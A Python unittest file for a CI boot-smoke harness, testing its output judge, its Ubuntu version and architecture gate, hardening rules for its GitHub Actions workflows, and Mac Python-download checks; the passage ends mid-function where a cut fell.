"""The boot smoke's own tests, offline: the judge that decides a run, the workflow's static rules, and a driver run over the
newest real release folder. The key and TLS tests are skipped when ssh-keygen or openssl is missing."""
from __future__ import annotations

import contextlib
import hashlib
import importlib.util
import io
import tarfile
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import textwrap
import unittest
import unittest.mock as mock
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / 'tests' / 'fixture'))
import make_fixture as mf  # noqa: E402
import serve  # noqa: E402
import smoke_driver as sd  # noqa: E402
from smoke_driver import UBUNTU_OK  # noqa: E402

TOOLS = bool(shutil.which('ssh-keygen') and shutil.which('openssl')) and os.path.exists(mf.PUB.SSH_KEYGEN)
WF = (ROOT / '.github' / 'workflows' / 'boot-smoke.yml').read_text()
INSTALL = (ROOT / '.github' / 'workflows' / 'install.yml').read_text()
SMOKE = re.search(r'(?ms)^  smoke:\n(.*?)(?=^  [\w-]+:\n|\Z)', INSTALL)[1]   # install.yml's gate: the same smoke over the fleet tip's loaders (AF34)
FIXTURE = re.search(r'(?ms)^  fixture:\n(.*?)(?=^  [\w-]+:\n|\Z)', INSTALL)[1]   # ... over a fixture built once on ubuntu, as the dispatch does


class Fixture(unittest.TestCase):
    def test_the_dummy_kit_code_is_the_one_the_driver_expects(self):
        self.assertEqual(sd.CODE, mf.CODE)

    def test_the_driver_names_a_download_path_by_its_file(self):
        self.assertEqual(sd.logical('/releases/download/install-20/install.json'), 'install.json')

    def test_the_driver_names_the_pbs_path_python_mac_and_hides_its_object_hop(self):  # G-SMOKE-MAC-1
        pbs = '/pbs/releases/download/20260929/cpython-3.14.7+20260929-aarch64-apple-darwin-install_only.tar.gz'
        self.assertEqual(sd.logical(pbs), 'python-mac')
        self.assertIsNone(sd.logical(pbs.replace('/releases/download/', '/objects/')))   # the 302's target is not a request of its own
        self.assertIsNone(sd.logical('/pbs/releases/download/x/cpython-3.14.7+x-aarch64-apple-darwin-install_only.tar.gz'))


class Judge(unittest.TestCase):
    SHA, FP = 'a' * 64, 'SHA256:fp'
    CASE = {'id': 'sig-x', 'os': 'sh', 'code': 'sig', 'info': 2, 'serial_line': 'serial 20 valid_until T', 'reqs': ['install.json', 'install.json.sig']}
    OUT = f'bootstrap sha256 {SHA}\nkey SHA256:fp\nREFUSED sig\nThe signature did not verify. Nothing was run.\n'
    LOG = [{'path': f'/releases/download/install-20/{n}', 'status': 302, 'ua': 'curl/8.5', 'tls': 'TLSv1.3'} for n in ('install.json', 'install.json.sig')]

    def judge(self, out=OUT, rc=1, log=LOG, http=(), left=(), case=CASE, mach=None):
        return sd.judge(case, sd.expect(case, mach, True), out, rc, self.SHA, self.FP, list(log), list(http), list(left), False)

    def test_the_right_run_passes_and_each_wrong_one_fails(self):
        self.assertEqual(self.judge(), [])
        self.assertEqual(self.judge(out=self.OUT.replace('\n', '\r\n')), [])  # CRLF and blank lines are stripped first
        bad = {
            'order': self.OUT.replace(f'bootstrap sha256 {self.SHA}\nkey SHA256:fp', f'key SHA256:fp\nbootstrap sha256 {self.SHA}'),
            'trailing line': self.OUT + 'extra\n', 'no sentence': self.OUT.rsplit('\n', 2)[0] + '\n',
            'wrong code': self.OUT.replace('REFUSED sig', 'REFUSED fetch'), 'wrong hash': self.OUT.replace(self.SHA, 'b' * 64),
            'no period': self.OUT.replace('Nothing was run.', 'Nothing was run'), 'lower code line': self.OUT.replace('REFUSED', 'refused')}
        for why, out in bad.items():
            self.assertTrue(self.judge(out=out), why)
        self.assertTrue(self.judge(rc=0))
        self.assertTrue(self.judge(log=self.LOG[:1]))
        self.assertTrue(self.judge(log=[{**self.LOG[0], 'ua': 'Mozilla'}, self.LOG[1]]))
        self.assertTrue(self.judge(log=[{**self.LOG[0], 'tls': 'TLSv1.1'}, self.LOG[1]]))
        self.assertTrue(self.judge(http=[{'path': '/install-20/install.json'}]))
        self.assertEqual(self.judge(http=[{'path': '/ca.crl'}]), [])
        self.assertTrue(self.judge(left=['fleet-boot.abc']))

    def test_a_linux_run_without_kvm_is_judged_by_its_real_output(self):  # the sentence starts with a slash
        good = {'id': 'good-sh', 'os': 'sh', 'code': None, 'info': 3, 'serial_line': 'serial 20 valid_until T', 'reqs': []}
        warn = 'warning: Firecracker supports host kernels 5.10, 6.1 and 6.18; this one is 6.8.0 and the Ubuntu stock kernel is not on that list'
        info = f'bootstrap sha256 {self.SHA}\nkey SHA256:fp\nserial 20 valid_until T\n'
        tail = f'Your code: {sd.CODE}\nREFUSED kvm\n/dev/kvm is missing or not readable and writable by you; send your code to the owner.\n'
        run = lambda out: sd.judge(good, ex, out, 1, self.SHA, self.FP, [], [], [], True)  # noqa: E731
        with mock.patch.object(sd.platform, 'system', return_value='Linux'):
            ex = sd.expect(good, None, False)
            self.assertEqual(ex['code'], 'kvm')
            self.assertEqual(run(info + warn + '\n' + tail), [])
            self.assertTrue(run(info + tail.replace('Your code', 'My code')))  # the code line is still required
            self.assertTrue(run(info + tail + warn + '\n'))  # a warning after the code does not count
            self.assertTrue(run(info + warn + '\n' + tail.replace('send your code to the owner.', 'send your code')))

    def test_expect_follows_the_machine(self):
        good = {**self.CASE, 'code': None, 'info': 3, 'reqs': ['install.json']}
        self.assertEqual(sd.expect(good, 'os', True)['code'], 'os')
        self.assertEqual(sd.expect(good, 'os', True)['reqs'], [])
        self.assertEqual(sd.expect({**good, 'code': 'args', 'info': 0}, 'os', True)['code'], 'args')
        self.assertEqual(sd.expect(good, None, True)['code'], None)
        if sd.platform.system() == 'Linux':
            self.assertEqual(sd.expect(good, None, False), {'code': 'kvm', 'info': 3, 'reqs': ['install.json'], 'show': True})

    def test_a_good_run_needs_its_code_line(self):
        good = {**self.CASE, 'code': None, 'info': 3, 'reqs': []}
        out = f'bootstrap sha256 {self.SHA}\nkey SHA256:fp\nserial 20 valid_until T\nYour code: {sd.CODE}\n'
        self.assertEqual(self.judge(out=out, rc=0, log=[], case=good), [])
        self.assertTrue(self.judge(out=out.replace('Your code', 'My code'), rc=0, log=[], case=good))


class MachineGate(unittest.TestCase):
    """The driver's OS and arch gate (PV11b, G-PC-3), over a temp os-release per case: no real /etc/os-release is read."""

    def gate(self, text, arch='x86_64'):
        with tempfile.TemporaryDirectory() as t:
            f = Path(t) / 'os-release'
            if text is not None:
                f.write_bytes(text) if isinstance(text, bytes) else f.write_text(text)
            with mock.patch.object(sd, 'WIN', False), mock.patch.object(sd.platform, 'system', return_value='Linux'):
                return sd.machine(str(f), arch)

    @staticmethod
    def rel(vid, id_='ubuntu'):
        return f'NAME="x"\nID={id_}\n' + (f'VERSION_ID="{vid}"\n' if vid is not None else '') + 'VERSION_CODENAME=x\n'

    def test_ubuntu_24_04_and_26_04_on_x86_64_reach_the_cases(self):
        self.assertIsNone(self.gate(self.rel('24.04')))  # the control: main's own case
        self.assertIsNone(self.gate(self.rel('26.04')))  # main refuses this with `os`
        self.assertIsNone(self.gate(self.rel('26.04'), 'amd64'))
        self.assertIsNone(self.gate(self.rel('26.04').replace('"', '')))  # an unquoted VERSION_ID

    def test_every_other_os_release_is_refused_os(self):
        for why, text in {'22.04': self.rel('22.04'), '24.10': self.rel('24.10'), '25.10': self.rel('25.10'), '26.10': self.rel('26.10'),
                          '26.04.1 (exact match)': self.rel('26.04.1'), 'debian 26.04': self.rel('26.04', 'debian'),
                          'linuxmint 24.04': self.rel('24.04', 'linuxmint'), 'no VERSION_ID': self.rel(None), 'no ID': 'VERSION_ID="26.04"\n',
                          'empty file': '', 'unreadable file': None,
                          'linuxmint ID_LIKE=ubuntu': 'ID=linuxmint\nID_LIKE=ubuntu\nVERSION_ID="26.04"\n',
                          'ubuntu-core': self.rel('26.04', 'ubuntu-core'), 'Ubuntu caps': self.rel('26.04', 'Ubuntu'),
                          'empty VERSION_ID': 'ID=ubuntu\nVERSION_ID=""\n',
                          'undecodable bytes': b'ID=ubuntu\n\xff\xfe\nVERSION_ID="26.04"\n'}.items():
            self.assertEqual(self.gate(text), 'os', why)

    def test_a_refused_arch_shows_once_the_os_is_admitted(self):
        for v in UBUNTU_OK:
            self.assertEqual(self.gate(self.rel(v), 'aarch64'), 'arch', v)
        self.assertEqual(self.gate(self.rel('22.04'), 'aarch64'), 'os')  # the os is checked first

    def test_the_default_arch_is_this_machines(self):
        with mock.patch.object(sd.platform, 'machine', return_value='aarch64'):
            self.assertEqual(self.gate(self.rel('26.04'), None), 'arch')
        with mock.patch.object(sd.platform, 'machine', return_value='x86_64'):
            self.assertIsNone(self.gate(self.rel('26.04'), None))

    def test_a_non_linux_machine_does_not_read_the_os_release(self):
        with mock.patch.object(sd, 'WIN', False), mock.patch.object(sd.platform, 'system', return_value='Darwin'):
            self.assertIsNone(sd.machine('/nonexistent/os-release', 'arm64'))

    def test_a_26_04_runner_runs_the_cases(self):
        good = {**Judge.CASE, 'code': None, 'info': 3, 'reqs': ['install.json']}
        self.assertIsNone(sd.expect(good, self.gate(self.rel('26.04')), True)['code'])
        self.assertEqual(sd.expect(good, self.gate(self.rel('26.10')), True)['code'], 'os')

    # The same literal lives in mirrorstack-fleet (backends.UBUNTU_OK, pinned by the PV11 twin test next to bootstrap.sh's
    # check_machine arm); the repos cannot read each other from a test, so each pins it. Change all three together.
    def test_the_admitted_releases_are_the_pinned_literal(self):
        self.assertEqual(sd.UBUNTU_OK, ('24.04', '26.04'))

    @staticmethod
    def loader_versions(text):
        """The versions a bootstrap.sh check_machine admits: the arms before `*)` of the case over VERSION_ID."""
        body = text[text.index("sed -n 's/^VERSION_ID=//p')"):]
        arms = body[:body.index('*)')]
        return set().union(*(a.replace(' ', '').split('|')
                             for a in re.findall(r'(?m)^\s*([0-9][0-9.]*(?:\s*\|\s*[0-9][0-9.]*)*)\)\s*;;', arms)))

    def test_the_loader_arm_reader_reads_both_shapes(self):  # main's one-version arm and PV11's two-version arm
        sh = "  case $(printf '%s\\n' \"$osrel\" | sed -n 's/^VERSION_ID=//p') in\n    {}) ;;\n    *) die os 'x' ;;\n  esac\n"
        self.assertEqual(self.loader_versions(sh.format('24.04')), {'24.04'})
        self.assertEqual(self.loader_versions(sh.format('24.04|26.04')), {'24.04', '26.04'})
        self.assertEqual(self.loader_versions(sh.format('24.04 | 26.04')), {'24.04', '26.04'})
        self.assertEqual(self.loader_versions(sh.format('24.04) ;;\n    26.10')), {'24.04', '26.10'})  # several arms: a union

    def test_the_driver_admits_what_the_newest_release_loader_admits(self):
        # VACUOUS today: fleet-disk has no release/ folder yet (they live in mirrorstack-fleet), so this wakes up when one is
        # committed here. `<=` is the direction that matters (a driver refusing what the loader admits is the failure R9 saw);
        # a driver admitting MORE than the loader is not caught. Tighten to `==` after the first release folder that carries PV11 (G-PC-22).
        found = sorted(ROOT.glob('release/install-*'), key=lambda p: int(p.name.split('-')[1]))
        if not found or not (found[-1] / 'bootstrap.sh').is_file():
            self.skipTest('no release folder yet')
        self.assertLessEqual(self.loader_versions((found[-1] / 'bootstrap.sh').read_text()), set(sd.UBUNTU_OK))


class Workflow(unittest.TestCase):
    def test_permissions_secrets_and_triggers(self):
        self.assertRegex(WF, r'(?m)^permissions:\n  contents: read\n')
        self.assertNotRegex(WF, r'(?m)^\s+(contents|id-token|actions|pull-requests|packages): write')
        for bad in ('secrets.', 'pull_request_target', 'actions/cache', 'self-hosted', 'environment:'):
            self.assertNotIn(bad, WF)

    def test_actions_are_sha_pinned_and_checkouts_keep_no_credentials(self):
        uses = re.findall(r'uses: (\S+)', WF)
        self.assertGreaterEqual(len(uses), 6)
        for u in uses:
            self.assertRegex(u, r'^actions/[a-z-]+@[0-9a-f]{40}$')
        self.assertEqual(WF.count('persist-credentials: false'), WF.count('actions/checkout@'))

    def test_every_job_has_a_timeout_and_no_expression_is_in_a_script(self):
        self.assertEqual(WF.count('runs-on:'), WF.count('timeout-minutes:'))
        lines, block = WF.split('\n'), None
        for line in lines:
            ind = len(line) - len(line.lstrip())
            if block is not None and line.strip() and ind <= block:
                block = None
            if block is not None:
                self.assertNotIn('${{', line)
            m = re.match(r'\s*(?:- )?run:(.*)', line)
            if m:
                self.assertNotIn('${{', m[1])
                if m[1].strip() == '|':
                    block = ind
        self.assertIn('${{ matrix.os }}', WF)  # reaches the script only through env:

    def test_the_runner_labels_are_the_designed_ones(self):
        got = set(re.findall(r'runner: ([a-z0-9.-]+)', WF))
        self.assertEqual(got, {'windows-2022', 'windows-2025', 'ubuntu-24.04', 'ubuntu-22.04', 'ubuntu-26.04', 'macos-15'})
        self.assertEqual(WF.count('experimental: true'), 2)   # keychain and ubuntu-26.04: neither gates a release (PZ03b)
        self.assertEqual(len(re.findall(r'os: ps1', WF)), 2)

    def test_only_the_designed_refusal_may_skip_the_cases(self):  # a machine refusal would otherwise pass every case vacuously
        rows = re.findall(r'runner: ([a-z0-9.-]+),.*?must_run: (true|false)', WF)
        self.assertEqual(sorted(rows), sorted([('windows-2022', 'true'), ('windows-2025', 'true'), ('ubuntu-24.04', 'true'),
                                                ('ubuntu-22.04', 'false'), ('ubuntu-26.04', 'true'), ('macos-15', 'true'), ('macos-15', 'true')]))
        self.assertIn('--must-run', WF)

    # install.yml's `smoke` job runs the same rows and steps over the loaders of the release tip, before `sign` (AF34)

    @staticmethod
    def smoke_rows(text):
        """(runner, os, trust, must_run) of install.yml's block-style rows."""
        return re.findall(r'(?m)^          - runner: ([\w.-]+)(?: +#.*)?\n            os: (\w+)\n            trust: ([\w-]+)\n            must_run: (true|false)\n', text)

    def test_the_release_gate_runs_the_same_rows_as_the_dispatch_but_the_experimental_one(self):
        gate = self.smoke_rows(SMOKE)
        dispatch = [r for r in re.findall(r'runner: ([a-z0-9.-]+), os: (\w+), trust: ([\w-]+), must_run: (true|false), experimental: (true|false)', WF)
                    if r[4] == 'false']
        self.assertEqual(len(gate), 5)
        self.assertEqual(gate, [r[:4] for r in dispatch])   # a row changed in one file and not the other fails here
        self.assertEqual(SMOKE.count('          - runner:'), len(gate))   # no row in another shape
        self.assertNotIn('experimental', SMOKE)
        self.assertNotIn('keychain', SMOKE)

    def test_only_the_designed_refusal_may_skip_the_cases_in_the_release_gate(self):
        self.assertEqual(sorted((r[0], r[3]) for r in self.smoke_rows(SMOKE)),
                         sorted([('windows-2022', 'true'), ('windows-2025', 'true'), ('ubuntu-24.04', 'true'), ('ubuntu-22.04', 'false'), ('macos-15', 'true')]))
        self.assertEqual(len(re.findall(r'os: ps1', SMOKE)), 2)
        self.assertEqual(set(re.findall(r'runner: ([a-z0-9.-]+)', SMOKE)), {'windows-2022', 'windows-2025', 'ubuntu-24.04', 'ubuntu-22.04', 'macos-15'})
        self.assertIn('[ "$BOOT_MUST" = true ] && flag=(--must-run)', SMOKE)
        self.assertIn('BOOT_MUST: ${{ matrix.must_run }}', SMOKE)
        self.assertIn('--os "$BOOT_OS" "${flag[@]}"', SMOKE)

    def test_the_release_gate_and_the_dispatch_run_the_same_driver_and_trust_steps(self):
        for step in ('python tests/fixture/smoke_driver.py probe', 'python tests/fixture/smoke_driver.py control --dir fixture --phase before',
                     'python tests/fixture/smoke_driver.py control --dir fixture --phase after',
                     'Import-Certificate -FilePath fixture\\tls\\ca.cer -CertStoreLocation Cert:\\LocalMachine\\Root',
                     'sudo cp fixture/tls/ca.crt /usr/local/share/ca-certificates/fleet-smoke.crt && sudo update-ca-certificates',
                     'echo "CURL_CA_BUNDLE=$GITHUB_WORKSPACE/fixture/tls/ca.crt" >> "$GITHUB_ENV"',
                     'python tests/fixture/smoke_driver.py fixture --dir fixture --os "$BOOT_OS" "${flag[@]}"'):
            self.assertIn(step + '\n', WF)   # the whole line: a flag added to one copy is not "the same step"
            self.assertIn(step + '\n', SMOKE)
        for cond in ("if: matrix.trust != 'none'", "if: matrix.trust == 'root-store'", "if: matrix.trust == 'ca-certificates'",
                     "if: matrix.trust == 'curl-ca-bundle'"):
            self.assertIn(cond, SMOKE)
            self.assertIn(cond, WF)
        self.assertEqual(SMOKE.count("if: matrix.trust != 'none'"), 2)   # before and after the trust step

    def test_the_release_gate_builds_the_fixture_once_from_the_loaders_it_was_handed(self):
        self.assertIn('make_fixture.py --out fixture --ps1 loaders/bootstrap.ps1 --sh loaders/bootstrap.sh --kit-json loaders/kit.json\n', FIXTURE)   # G-SMOKE-MAC-1: the tip's kit.json carries the Mac pin
        self.assertNotIn('--boot-dir', FIXTURE)   # the tip's folder is not in this checkout: only the two loaders and the kit cross
        self.assertNotIn('--no-verify', FIXTURE)
        self.assertIn('name: loaders', FIXTURE)
        # run 38633686710: built on each leg it was REFUSED tool on macos-15 and REFUSED verify on both Windows legs; so no leg builds it
        self.assertNotIn('make_fixture', SMOKE)
        self.assertNotIn('--ps1', SMOKE)
        self.assertNotIn('name: loaders', SMOKE)
        self.assertIn('          name: fixture\n          path: fixture\n', SMOKE)   # the legs download what the fixture job uploaded
        self.assertEqual(len(re.findall(r'make_fixture\.py', INSTALL.split('\njobs:\n', 1)[1])), 1)

    @staticmethod
    def steps_of(job):
        return re.findall(r'(?ms)^      - .*?(?=^      - |\Z)', job.split('    steps:\n', 1)[1])

    def test_the_fixture_job_is_the_twin_of_the_dispatchs_fixture_job_line_by_line(self):
        boot = re.search(r'(?ms)^  fixture:\n(.*?)(?=^  [\w-]+:\n|\Z)', WF)[1]
        for field in ('    runs-on: ubuntu-24.04\n', '    timeout-minutes: 10\n'):
            self.assertIn(field, boot)
            self.assertIn(field, FIXTURE)
        # the dispatch's own plan step and its `have` conditions are the only differences: drop them, then compare step by step
        theirs = [re.sub(r"^      - if: steps\.plan\.outputs\.have == 'true'\n        ", '      - ', st) for st in self.steps_of(boot)]
        mine = self.steps_of(FIXTURE)
        by_use = lambda steps, use: [st for st in steps if f'uses: {use}@' in st]
        for use in ('actions/checkout', 'actions/setup-python', 'actions/upload-artifact'):
            self.assertEqual(len(by_use(mine, use)), 1, use)
            self.assertEqual(by_use(mine, use), by_use(theirs, use), use)   # the same pinned action and inputs, byte for byte
        run = lambda steps: [st for st in steps if 'make_fixture.py' in st]
        self.assertEqual((len(run(mine)), len(run(theirs))), (1, 1))
        # the same interpreter, script and output folder; only the input differs: the dispatch has a folder, this has the two loaders and the kit
        strip = lambda st: re.sub(r' --(?:boot-dir "\$BOOT_DIR" --kit-json "\$BOOT_DIR/kit\.json"|ps1 \S+ --sh \S+ --kit-json \S+)$', '', st.strip().split('run: ', 1)[1])
        self.assertEqual(strip(run(mine)[0]), 'python3 tests/fixture/make_fixture.py --out fixture')
        self.assertEqual(strip(run(mine)[0]), strip(run(theirs)[0]))

    def test_both_fixture_jobs_hand_the_release_kit_to_the_builder_for_the_mac_pin(self):  # G-SMOKE-MAC-1
        self.assertIn('--boot-dir "$BOOT_DIR" --kit-json "$BOOT_DIR/kit.json"\n', WF)
        self.assertIn('for f in bootstrap.sh bootstrap.ps1 kit.json; do', INSTALL)   # the plan's loaders step copies it from the tip, beside the two
        self.assertEqual([r for r in re.findall(r'must_run: (true|false)', SMOKE)].count('true'), 4)   # the macos-15 row keeps must_run: the Mac rows ride it

    def test_the_ubuntu_26_04_row_is_experimental_and_only_in_the_dispatch(self):  # PZ03b: a weekly-moving hosted image must not gate a release
        rows = re.findall(r'(?m)^          - (\{runner: ubuntu-26\.04,[^\n]*\})', WF)
        self.assertEqual(len(rows), 1)
        self.assertRegex(rows[0], r'^\{runner: ubuntu-26\.04, os: sh, trust: ca-certificates, must_run: true, experimental: true\}')
        self.assertNotIn('26.04', re.sub(r'(?m)^\s*#.*$', '', SMOKE.split('matrix:', 1)[1].split('steps:', 1)[0]))   # the release gate's rows never name it
        self.assertNotIn('26.04', REAL_WF.split('matrix:', 1)[1].split('steps:', 1)[0])   # nor do smoke-real's
        self.assertIn('    timeout-minutes: 25\n    continue-on-error: ${{ matrix.experimental }}\n', WF)   # the flag is what keeps a red row from failing the run; the row's bound is the job's 25

    def test_the_dispatch_stays_and_keeps_the_experimental_row(self):  # its no-loader failure is pinned by the plan-step tests above
        self.assertIn('workflow_dispatch:', WF)
        self.assertIn('keychain, must_run: true, experimental: true', WF)   # the experimental row stays here, not in the gate

    def test_the_manual_input_is_matched_whole_and_written_without_echo(self):
        plan = WF[WF.index('id: plan'):WF.index('python3 tests/fixture/make_fixture.py')]
        self.assertIn('[[ $dir =~ $re ]]', plan)
        self.assertNotIn('grep', plan)
        self.assertNotIn('echo "dir=', plan)

    def test_the_new_actions_are_the_confirmed_releases(self):
        self.assertIn('upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02  # v4.6.2', WF)
        self.assertIn('download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093  # v4.3.0', WF)

    def plan(self, event, files, boot_dir=''):
        """Runs the plan step's script as Actions runs it (bash -e -o pipefail, only these env vars) in a tree holding `files`:
        (return code, stdout, what it wrote to GITHUB_OUTPUT)."""
        import subprocess
        block = WF.split('      - id: plan\n', 1)[1].split('        run: |\n', 1)[1]
        lines = []
        for l in block.split('\n'):
            if not l.startswith('          '):
                break
            lines.append(l[10:])
        bash = shutil.which('bash')
        if not bash:
            self.skipTest('no bash')
        with tempfile.TemporaryDirectory() as d:
            for f in files:
                os.makedirs(os.path.dirname(os.path.join(d, f)), exist_ok=True)
                open(os.path.join(d, f), 'w').close()
            out = os.path.join(d, 'out')
            r = subprocess.run([bash, '--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', '\n'.join(lines)], cwd=d,
                               env={'PATH': os.environ['PATH'], 'BOOT_DIR': boot_dir, 'BOOT_EVENT': event, 'GITHUB_OUTPUT': out},
                               capture_output=True, text=True, timeout=30)
            written = Path(out).read_text() if os.path.exists(out) else ''
        return r.returncode, r.stdout, written, r.stderr

    PAIR = ('bootstrap.ps1', 'bootstrap.sh')

    def test_the_plan_step_runs_as_actions_runs_it(self):  # bash -e -o pipefail: a ref with no release folder must skip, not fail
        for event in ('pull_request', 'push'):
            rc, out, written, err = self.plan(event, ())
            self.assertEqual(rc, 0, err)
            self.assertIn('have=false', written)
            self.assertIn('::notice::', out)
            self.assertNotIn('::error::', out)
        for event in ('pull_request', 'workflow_dispatch'):
            files = [f'release/install-{n}/{b}' for n in (3, 12) for b in self.PAIR]
            rc, out, written, err = self.plan(event, files)
            self.assertEqual(rc, 0, err)
            self.assertIn('dir=release/install-12', written)
            self.assertIn('have=true', written)

    def test_a_dispatch_that_would_run_nothing_fails(self):
        rc, out, written, err = self.plan('workflow_dispatch', ())
        self.assertNotEqual(rc, 0)
        self.assertIn('::error::', out)
        self.assertIn('have=false', written)
        rc, out, written, err = self.plan('workflow_dispatch', (), boot_dir='release/install-9')  # a named folder that is not there
        self.assertNotEqual(rc, 0)
        self.assertIn('::error::', out)

    def test_a_release_folder_that_is_not_a_pair_fails_on_a_pull_request_and_on_a_dispatch(self):
        for event in ('pull_request', 'workflow_dispatch'):
            for only in self.PAIR:
                with self.subTest(event=event, only=only):
                    rc, out, written, err = self.plan(event, [f'release/install-3/{only}'])
                    self.assertNotEqual(rc, 0)
                    self.assertIn('::error::', out)
                    self.assertNotIn('dir=', written)

    def test_a_plain_file_named_like_a_release_folder_is_not_a_folder(self):
        rc, out, written, err = self.plan('pull_request', ['release/install-notes.md'])
        self.assertEqual(rc, 0, err)
        self.assertIn('have=false', written)
        self.assertIn('::notice::', out)
        self.assertNotIn('::error::', out)

    def test_the_event_reaches_the_plan_through_env_only(self):
        self.assertIn('BOOT_EVENT: ${{ github.event_name }}', WF)
        self.assertIn('"$BOOT_EVENT"', WF[WF.index('id: plan'):WF.index('python3 tests/fixture/make_fixture.py')])


@unittest.skipUnless(TOOLS and shutil.which('sh') and shutil.which('curl'), 'ssh-keygen, openssl, sh or curl is missing')
class RealBootstrap(unittest.TestCase):
    def test_the_sh_driver_passes_on_the_newest_release_folder(self):  # skipped until a release/install-* folder is committed
        found = sorted(ROOT.glob('release/install-*'), key=lambda p: int(p.name.split('-')[1]))
        if not found or not (found[-1] / 'bootstrap.sh').is_file() or not (found[-1] / 'bootstrap.ps1').is_file():
            self.skipTest('no release folder yet')
        ports = []
        for _ in range(2):
            with socket.socket() as sk:
                sk.bind(('127.0.0.1', 0))
                ports.append(sk.getsockname()[1])
        with tempfile.TemporaryDirectory() as t:
            (Path(t) / 'z.zip').write_bytes(b'PKfake')
            out = Path(t) / 'fx'
            mf.build(out, found[-1] / 'bootstrap.ps1', found[-1] / 'bootstrap.sh', port=ports[0], crl_port=ports[1], zip_path=Path(t) / 'z.zip')
            with mock.patch.dict(os.environ, {'CURL_CA_BUNDLE': str(out / 'tls' / 'ca.crt')}):
                if sd.main(['control', '--dir', str(out), '--phase', 'after']) != 0:
                    self.skipTest('this curl does not take CURL_CA_BUNDLE')
                self.assertEqual(sd.main(['fixture', '--dir', str(out), '--os', 'sh']), 0)


class MacJudge(unittest.TestCase):
    """G-SMOKE-MAC-1: what a python-mac row must do, as a judge over its output and request log."""
    GET = [{'path': '/pbs/releases/download/20260929/cpython-3.14.7+20260929-aarch64-apple-darwin-install_only.tar.gz', 'status': 302,
            'ua': 'curl/8.7', 'tls': 'TLSv1.3'},
           {'path': '/pbs/objects/20260929/cpython-3.14.7+20260929-aarch64-apple-darwin-install_only.tar.gz', 'status': 200, 'ua': 'curl/8.7',
            'tls': 'TLSv1.3'}]
    GOOD = 'mac-row fetch_python\nmac-row python_ok\n'
    REFUSE = 'mac-row fetch_python\nREFUSED {}\nThe Python download is not the one the owner signed. Nothing was changed. Tell the owner.\n'

    def judge(self, kind, out, rc, log=(), http=(), left=()):
        return sd.judge_mac(kind, out, rc, list(log), list(http), list(left))

    def test_each_row_passes_on_its_designed_outcome(self):
        self.assertEqual(self.judge('good', self.GOOD, 0, self.GET), [])
        self.assertEqual(self.judge('null', self.REFUSE.format('python-lock'), 1), [])
        self.assertEqual(self.judge('hash', self.REFUSE.format('python-hash'), 1, self.GET), [])

    def test_a_row_that_never_reached_fetch_python_is_red_even_if_the_rest_looks_right(self):  # must-run: never green on a skip
        for kind, out, rc, log in (('good', 'mac-row python_ok\n', 0, self.GET), ('null', self.REFUSE.format('python-lock').replace('mac-row fetch_python\n', ''), 1, ()),
                                   ('hash', self.REFUSE.format('python-hash').replace('mac-row fetch_python\n', ''), 1, self.GET), ('good', '', 0, self.GET)):
            self.assertIn('the row never reached fetch_python', self.judge(kind, out, rc, log), kind)

    def test_each_wrong_outcome_fails(self):
        bad = {'python_ok refused': ('good', self.GOOD.replace('python_ok', 'python_ok refused'), 0, self.GET),
               'a refusal where a pass is due': ('good', self.REFUSE.format('python-hash'), 1, self.GET),
               'no request at all': ('good', self.GOOD, 0, []), 'two archive requests': ('good', self.GOOD, 0, self.GET + self.GET),
               'the null row reached the network': ('null', self.REFUSE.format('python-lock'), 1, self.GET),
               'the null row ended in the hash refusal': ('null', self.REFUSE.format('python-hash'), 1, ()),
               'the hash row ended in a pass': ('hash', self.GOOD, 0, self.GET), 'the hash row never asked': ('hash', self.REFUSE.format('python-hash'), 1, []),
               'a refusal with the wrong exit': ('hash', self.REFUSE.format('python-hash'), 0, self.GET)}
        for why, (kind, out, rc, log) in bad.items():
            self.assertNotEqual(self.judge(kind, out, rc, log), [], why)

    def test_the_request_rules_of_a_case_hold_for_the_mac_rows_too(self):
        for why, log, http, left in (('not curl', [{**e, 'ua': 'Python-urllib'} for e in self.GET], (), ()),
                                     ('TLS 1.1', [{**e, 'tls': 'TLSv1.1'} for e in self.GET], (), ()),
                                     ('plain http', self.GET, [{'path': '/pbs/releases/download/x'}], ()), ('a temp folder left', self.GET, (), ['fleet-boot.abc'])):
            self.assertNotEqual(self.judge('good', self.GOOD, 0, log, http, left), [], why)
        self.assertEqual(self.judge('good', self.GOOD, 0, self.GET, [{'path': '/ca.crl'}]), [])   # the CRL fetch is not a plain-http download

    def test_the_rows_are_the_fixtures_rows_by_kind(self):
        self.assertEqual([r.rsplit('-', 1)[1] for r in mf.MAC_ROWS], list(sd.MAC_WANT))
        self.assertTrue(all(r.startswith('python-mac-') for r in mf.MAC_ROWS))

    def args(self, **kw):
        return mock.Mock(dir='fx', os='sh', must_run=kw.get('must', False))

    def run_fixture(self, system, rows=0, must=False, cases=()):
        meta = {'host': '127.0.0.1', 'port': 1, 'crl_port': 2, 'fingerprint': 'f', 'cases': [{'id': 'good-sh', 'os': 'sh'}, *cases]}
        with mock.patch.object(sd, 'load', return_value=meta), mock.patch.object(sd, 'machine', return_value=None), \
                mock.patch.object(sd.serve, 'Fixture'), mock.patch.object(sd, 'run_case', return_value=([], '')), \
                mock.patch.object(sd, 'run_mac_rows', return_value=rows) as mac, mock.patch.object(sd.platform, 'system', return_value=system), \
                contextlib.redirect_stdout(io.StringIO()):
            return sd.cmd_fixture(self.args(must=must)), mac

    def test_only_a_mac_runs_the_mac_rows_and_their_failure_fails_the_run(self):
        rc, mac = self.run_fixture('Linux')
        self.assertEqual((rc, mac.call_count), (0, 0))
        rc, mac = self.run_fixture('Darwin')
        self.assertEqual((rc, mac.call_count, mac.call_args.args[3]), (0, 1, False))
        self.assertEqual(self.run_fixture('Darwin', rows=1)[0], 1)   # a red Mac row fails the job though every case was as expected
        self.assertTrue(self.run_fixture('Darwin', must=True)[1].call_args.args[3])   # --must-run reaches the rows

    def test_a_mac_fixture_without_a_pin_is_a_failure_under_must_run_and_a_skip_without(self):
        meta = {'cases': [{'id': 'good-sh'}]}
        for must, want in ((True, 1), (False, 0)):
            with contextlib.redirect_stdout(io.StringIO()) as shown:
                self.assertEqual(sd.run_mac_rows('fx', meta, mock.Mock(), must), want)
            self.assertIn('FAIL' if must else 'skip', shown.getvalue())


def mac_tgz(script: bytes = b'#!/bin/sh\nexit 0\n') -> bytes:
    """A tiny python-build-standalone-shaped tar.gz whose python3 is a stub that exits 0 (a version and zstd probe both pass)."""
